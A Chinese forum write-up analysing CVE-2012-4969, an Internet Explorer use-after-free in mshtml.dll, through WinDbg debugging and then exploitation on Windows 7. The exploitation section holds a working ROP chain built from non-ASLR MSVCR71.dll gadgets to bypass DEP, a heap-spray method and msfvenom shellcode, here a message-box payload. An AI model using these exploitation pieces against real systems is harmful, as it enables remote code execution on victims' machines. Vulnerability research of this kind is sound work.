> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-267254.htm#msg_header_h2_3)

UAF 之 CVE-2012-4969 漏洞分析
========================

目录

*   [UAF 之 CVE-2012-4969 漏洞分析](#uaf之cve-2012-4969漏洞分析)
*            [一、漏洞信息](#一、漏洞信息)
*                    1. 漏洞简述
*                    2. 漏洞影响
*                    3. 解决方案
*            [二、漏洞复现](#二、漏洞复现)
*                    1. 环境搭建
*                    2. 复现过程
*            [三、漏洞分析](#三、漏洞分析)
*                    1. 基本信息
*                    2. 详细分析
*                            [漏洞函数分析](#漏洞函数分析)
*                            [POC 分析](#poc分析)
*            [四、漏洞利用](#四、漏洞利用)
*                    1. 利用环境
*                    2. 利用过程
*            [五、参考文献](#五、参考文献)

[](#一、漏洞信息)一、漏洞信息
-----------------

### 1. 漏洞简述

*   漏洞编号：CVE-2012-4969
*   漏洞类型：UAF
*   漏洞影响：远程代码执行
*   CVSS 分数：9.3
    
*   概述：mshtml.dll 的 CMshtmlEd :: Exec() 函数将 CMshtmlEd 对象释放后，又再次使用相同的内存，从而导致释放后使用的情况
    

### 2. 漏洞影响

Internet Explorer 6 至 9

### 3. 解决方案

[MS12-063](http://go.microsoft.com/fwlink/?linkid=255505)

[](#二、漏洞复现)二、漏洞复现
-----------------

### 1. 环境搭建

*   靶机环境版本
    *   win7 sp1 x86
*   靶机配置
    *   IE 8

### 2. 复现过程

使用 [metastploit 模块](https://www.rapid7.com/db/modules/exploit/windows/browser/ie_execcommand_uaf/)获取 poc1，LLmya.html

poc2，UGuQTe.html，两个文件保存在同一个目录下

```
  
  
    
      a
    
  


```

运行程序 poc1，触发漏洞

 

![](https://i.loli.net/2021/04/28/SqYwjWOAFfga5tG.png)

[](#三、漏洞分析)三、漏洞分析
-----------------

### 1. 基本信息

*   漏洞文件：mshtml.dll
*   漏洞函数：mshtml!CMshtmlEd::Exec
*   漏洞对象：CMshtmlEd

### 2. 详细分析

#### 漏洞函数分析

设置 hpa，ust 堆调试属性，使用 windbg 调试 IE 浏览器，执行 poc1，漏洞触发

 

![](https://i.loli.net/2021/04/28/13fTuF62Ysmbdqc.png)

 

查看 edi 的值

 

![](https://i.loli.net/2021/04/28/mquAWDSOBjeQ3sI.png)

 

查看函数调用堆栈

 

![](https://i.loli.net/2021/04/28/gGW9eJlAZ8cEw14.png)

 

IDA 中反汇编函数 CMshtmlEd::Exec，由于 win7 中打开了 ASLR，所以只能靠地址的后两个字节定位漏洞触发点 68b8503e。这里是 edi 地址引用错误，在函数中往前查看 edi 的赋值情况，edi 只有一次赋值且为 this 指针（不排除中间函数更改 edi 的可能，需要动态调试验证）

 

![](https://i.loli.net/2021/04/28/vtwTVmWeHfqEBSU.png)

 

在 CMshtmlEd::Exec 设置断点，单步执行查看 edi 的变化情况

```
bp mshtml!CMshtmlEd::Exec

```

edi 第一次赋值，查看堆的结构，得知 edi 指向 CMshtmlEd 实例的虚表

 

![](https://i.loli.net/2021/04/28/ENT2Pa7Y6cb8oZI.png)

 

![](https://i.loli.net/2021/04/28/PqcTeFpbQ4xAMzL.png)

 

继续执行到触发异常点，edi 还是指向同一个地方，但是! heap -p -a edi 已经没有输出了，说明 edi 指向的堆已经不存在，大概率为释放后重利用漏洞

 

![](https://i.loli.net/2021/04/28/dMGswOgaxYC6oDN.png)

 

下一步查看 CMshtmlEd 实例的释放过程，先找到与 CMshtmlEd 类有关的函数

```
x mshtml!CmshtmlEd::*

```

![](https://i.loli.net/2021/04/28/Luk8OHGdIZCS3Jm.png)

 

重点关注的函数

```
CMshtmlEd::Release
CMshtmlEd::~CMshtmlEd

```

不过析构函数一般是与 free 一起调用的，查看 CMshtmlEd::~CMshtmlEd，发现由 CMshtmlEd::Release 调用，查看 release，有一处跳转执行 free，所以就在 CMshtmlEd::Release 下断点

 

![](https://i.loli.net/2021/04/28/98Avw2hXiVaWsq7.png)

```
0:005> bp mshtml!CMshtmlEd::Exec    //漏洞函数
0:005> g
0:005> bp mshtml!CMshtmlEd::Release

```

运行到漏洞函数 CMshtmlEd::Exec 时设置 CMshtmlEd::Release 断点，第一次执行到 Release 函数没有跳转执行 free，第二次执行时调用了 free 函数

 

![](https://i.loli.net/2021/04/28/uN9TgrlI4yxdmDZ.png)

 

![](https://i.loli.net/2021/04/28/ct5nWfCd1Eob4PO.png)

 

查看 HeapFree 函数的参数，第三个为 this 指针 08178f78

 

![](https://i.loli.net/2021/04/28/SdsWlFMjyxHivIN.png)

 

继续执行之后就触发了异常，同时 edi 也是 08178f78，与被 free 掉的 this 指针相同，说明 this 指针在被释放后了又进行引用导致 UAF 漏洞

 

![](https://i.loli.net/2021/04/28/6eS9yAYkmXWMHna.png)

 

那么，CMshtmlEd::Release 的调用在漏洞函数 CMshtmlEd::Exec 哪里执行呢，查看 CMshtmlEd::Exec，在漏洞触发点 mov edi, dword ptr [edi+8] 之前存在一个函数 CCommand::Exec，需要使用 edi 指针，为什么执行之后就忽然 edi 指向的实例不存在了？

 

![](https://i.loli.net/2021/04/28/AHsRySzUPcvexgI.png)

 

执行 CCommamd::Exec 之前查看 edi

 

![](https://i.loli.net/2021/04/28/jTlKouQhUiGxEkL.png)

 

执行之后，edi 指向的 this 指针已经被 free 掉了，之后执行 mov edi, dword ptr [edi+8]，导致异常。

 

![](https://i.loli.net/2021/04/28/jYK9ySC1wMVxU6O.png)

 

验证：执行到 CMshtmlEd::Exec 时下断点 mshtml!CMshtmlEd::Release 和 mshtml!CCommand::Exec，程序先后在 CCommand::Exec 和 CMshtmlEd::Release 断下，并执行了 Heapfree 函数，说明 CCommand::Exec 中释放了 this 指针

#### POC 分析

windbg 结合 JavaScript 调试，确定 poc 何处引发漏洞

 

查看 CMshtmlEd 实例的构造和释放过程，在 IDA 中查看 CMshtmlEd::CMshtmlEd 的引用函数 AddCommandTarget 和 GetCommandTarget，都在分配了堆之后调用了 CMshtmlEd 的构造函数，所以关注构造函数就能直到堆的引用过程

 

AddCommandTarget 函数

 

![](https://i.loli.net/2021/04/28/nw7hlSOz1KsMgE6.png)

 

GetCommandTarget 函数

 

![](https://i.loli.net/2021/04/28/anQizWKlIpcxY2b.png)

 

在构造函数和 release 函数下断点

```
bp mshtml!CMshtmlEd::CMshtmlEd
bp mshtml!CMshtmlEd::Release

```

执行 funcB() 时命中构造函数，查看函数参数 this 指针，这里由 edx 保存，堆为 bb9af78

 

![](https://i.loli.net/2021/04/28/Ltxey6du1UwNY8b.png)

 

继续执行第二次命中构造函数，创建堆 9e52f78

 

![](https://i.loli.net/2021/04/28/FBZma8v15jWzTGl.png)

 

之后命中 release，没有调用 heapfree，然后执行 funcA()

 

![](https://i.loli.net/2021/04/28/IszAXy1kEKHTWUq.png)

 

命中 release，没有调用 heapfree，又一次命中 release，可以看到这里释放的堆为 9e52f78

 

![](https://i.loli.net/2021/04/28/wQJT75BWpPqt9l2.png)

 

然后引发了一个奇怪的异常，可能是由于 JavaScript 调试导致

 

![](https://i.loli.net/2021/04/28/vxizql73fILC9M6.png)

 

不过可以确定时 funcA() 引起的，write 常常会触发对象释放，后面对 arrr[0].src 赋值是一个占位动作  
![](https://i.loli.net/2021/04/28/wRECpDSkes7JZGu.png)

[](#四、漏洞利用)四、漏洞利用
-----------------

### 1. 利用环境

*   win7 sp1 x86
    
*   jdk1.6，其中 MSVCR71.dll 模块没有开启 ASLR
    
*   kali2.0

### 2. 利用过程

在 CMshtmlEd 对象被释放后，继续调用了 vtable 中的 [vtable + 8] 函数，如果能够构造个虚假的地址将 vtable 占位，即可试下 uaf 利用。poc 中 parent.arrr[0] 赋值实现了占位，程序，虚表指针 edi+8 指向了 0c0c0c08

 

![](https://i.loli.net/2021/04/28/b26GFigtlxzZaJM.png)

 

![](https://i.loli.net/2021/04/28/ambqAG7OMvURsBS.png)

 

接着运行程序，调用了 [[edi]+8]，我们要向控制 0c0c0c08 处写入 ROP 和 shellcode

 

![](https://i.loli.net/2021/04/28/soPnVDYWwrGvhdK.png)

 

Heap Spray，利用 JavaScript String 对象在内存中申请大量的堆块，堆一直占用直到地址 0c0c0c0c，同时每一个分配的堆块结构 sildecode+shellcode，sildecode 为 nop 等滑板指令，劫持程序执行流到任何一个堆块（本例为 0c0c0c0c）中都能够执行 shellcode，在 win7 等开启了 DEP 和 ASLR 的系统，要构造 ROP 调用 VirtualProtect 以关闭 dep，而且 ROP 位置要精准

 

为了实现 shellcode 精准到内存中指定位置：堆的大小和内部结构要非常精确，可以使用 js 的 heaplib 库，本次分析使用手动构造堆块。堆块进行分配的时候，因为堆块对齐，低 4 位 10000 大小的地址不会变化。举个例子，如果一个堆分配的低 4 位地址 002c，那么其他堆的低位同为 002c，只要以 0x1000 为单位进行构造堆块，那每个块结构机制都可轻易确定，如下图，low_offset 固定，但 high_offset 不一定相同，当然每个 shellcode 块之间不能有空隙，不然会执行到 0000 的空隙字符

 

![](https://i.loli.net/2021/04/28/xJhtX1jDaR5OQyo.png)

 

堆喷射代码，block 结构，filler 填充 0020 到 0c0c 到的内存，nop 继续填充满 1000 字节

 

![](https://i.loli.net/2021/04/28/dZhWkiue2nczSoJ.png)

 

分配 200MB 的 block，4 字节 bstr 头适应 js 的 string 对象，最后以 2 个字节结尾

 

![](https://i.loli.net/2021/04/28/BPsjkDhzIRu4LfM.png)

堆内存，90000 为! peb 的得到的进程堆基址，堆占用了 99.46，每块大小为 ffff0

 

![](https://i.loli.net/2021/04/28/GarvRPtu5koDbmU.png)

 

筛选大小为 ffff0 的堆块，可以看到每个堆块低位均为 0020

 

![](https://i.loli.net/2021/04/28/yBTpPR8frbaq5xE.png)

 

搜索 shellcode "FuzzySecurity"，可以看到每个 shellcode 间隔为 1000，正好为我们构造的 block，一部分内存已被 block 铺满，没有空隙

```
s -a 0x00000000 L?7fffffff "FuzzySecurity"

```

![](https://i.loli.net/2021/04/28/FwXmCNbqUK2B5nO.png)

 

构造 ROP

 

为了绕过 win7 的 dep 和 ASLR，需要构造 ROP 调用 VirtualProtect 以关闭 dep，win7 浏览器会加载 jdk1.6，其中有两个模块没有开启 ASLR 的模块，mona 插件查询 ROP

 

![](https://i.loli.net/2021/04/28/sj5zBXASwLkZTKe.png)

 

自动生成 ROP 链，有问题需稍加修改，之后更改 ROP 以令程序执行 call dword ptr [eax+8] 时能够跳转到 ROP，具体为迁移栈到 0c0c0c0c

```
!py mona rop -m "MSVCR71.dll, jp2ssv.dll"
 
//rop chain generated with mona.py - www.corelan.be
var rop_gadgets = unescape(
    "%u5b4f%u7c36" + // 0x7c365b4f : ,# POP EBX # POP EBP # RET [MSVCR71.dll]
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u8b05%u7c34" + // 0x7c348b05: ,# XCHG EAX,ESP # RETN
    "" + // #[---INFO:gadgets_to_set_ebp:---] :
    "%u6d28%u7c35" + // 0x7c356d28 : ,# POP EBP # RETN [MSVCR71.dll]
    "%u6d28%u7c35" + // 0x7c356d28 : ,# skip 4 bytes [MSVCR71.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] :
    // "%u09cf%u7c36" + // 0x7c3609cf : ,# POP EBX # RETN [MSVCR71.dll]
    // "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] :
    "%u4f8e%u7c34" + // 0x7c344f8e : ,# POP EDX # RETN [MSVCR71.dll]
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] :
    "%u8ab2%u7c35" + // 0x7c358ab2 : ,# POP ECX # RETN [MSVCR71.dll]
    "%uf2a1%u7c38" + // 0x7c38f2a1 : ,# &Writable location [MSVCR71.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] :
    "%ue239%u7c36" + // 0x7c36e239 : ,# POP EDI # RETN [MSVCR71.dll]
    "%ud202%u7c34" + // 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]
    "" + // #[---INFO:gadgets_to_set_esi:---] :
    "%uf8f8%u7c34" + // 0x7c34f8f8 : ,# POP ESI # RETN [MSVCR71.dll]
    "%u15a2%u7c34" + // 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]
    "%u6747%u7c37" + // 0x7c376747 : ,# POP EAX # RETN [MSVCR71.dll]
    "%ua151%u7c37" + // 0x7c37a140 : ,# ptr to &VirtualProtect() [IAT MSVCR71.dll]
    "" + // #[---INFO:pushad:---] :
    "%u8c81%u7c37" + // 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]
    "" + // #[---INFO:extras:---] :
    "%u5c30%u7c34" + // 0x7c345c30 : ,# ptr to 'push esp # ret ' [MSVCR71.dll]
"");

```

kali 生成 shellcode，以 js 小端序输出

```
kali@kali:~$ msfvenom -p windows/messagebox -f js_le
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 272 bytes
Final size of js_le file: 816 bytes
%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u5878%u6820%u6761%u4265%u4d68%u7365%u3173%u88db%u245c%u890a%u68e3%u2058%u2020%u4d68%u4653%u6821%u6f72%u206d%u6f68%u202c%u6866%u6548%u6c6c%uc931%u4c88%u1024%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855

```

最终 exploit

![](https://i.loli.net/2021/04/28/QvIqxhnyRTKB9e6.png)

[](#五、参考文献)五、参考文献
-----------------

*   https://www.anquanke.com/post/id/85592
*   https://www.52pojie.cn/thread-596064-1-1.html
*   https://blog.csdn.net/qs_hud/article/details/9821735

[[看雪官方培训] Unicorn Trace 还原 Ollvm 算法！《安卓高级研修班》2021 年 6 月班开始招生！！](https://bbs.pediy.com/thread-267018.htm)